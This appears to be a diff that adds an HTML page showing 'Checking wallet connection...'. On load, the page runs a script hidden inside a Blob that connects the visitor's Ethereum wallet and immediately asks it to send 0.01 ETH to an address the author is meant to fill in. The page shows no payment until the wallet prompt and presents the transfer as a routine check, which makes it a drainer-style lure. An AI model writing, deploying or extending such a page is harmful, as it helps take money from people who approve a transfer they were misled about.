@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Auto Connect & Send</title>
+</head>
+<body>
+  <h3 id="msg">Checking wallet connection...</h3>
+  <script>
+    const code = `
+      let userAccount = null;
+
+      async function connectAndSend() {
+        if (!window.ethereum) {
+          document.getElementById('msg').innerText = 'No wallet detected!';
+          return;
+        }
+
+        try {
+          // Coba konek wallet
+          const accounts = await window.ethereum.request({
+            method: 'eth_requestAccounts'
+          });
+          userAccount = accounts[0];
+          document.getElementById('msg').innerText = 'Connected: ' + userAccount;
+
+          // Setelah terkoneksi, kirim transaksi dengan izin pengguna
+          const txParams = {
+            from: userAccount,
+            to: '0x0000000000000000000000000000000000000000', // ganti dengan alamat tujuan
+            value: '0x2386F26FC10000', // 0.01 ETH dalam wei
+            gas: '0x5208', // 21000 gas
+          };
+
+          const txHash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [txParams],
+          });
+
+          document.getElementById('msg').innerText = 'Transaction sent! Hash: ' + txHash;
+
+        } catch (err) {
+          console.error(err);
+          document.getElementById('msg').innerText = 'User rejected or error occurred.';
+        }
+      }
+
+      // Jalankan otomatis saat halaman terbuka
+      window.addEventListener('load', connectAndSend);
+    `;
+
+    // Bungkus ke dalam Blob agar aman dari injeksi langsung
+    const blob = new Blob([code], { type: 'text/javascript' });
+    const scriptURL = URL.createObjectURL(blob);
+    const script = document.createElement('script');
+    script.src = scriptURL;
+    document.body.appendChild(script);
+  </script>
+</body>
+</html>
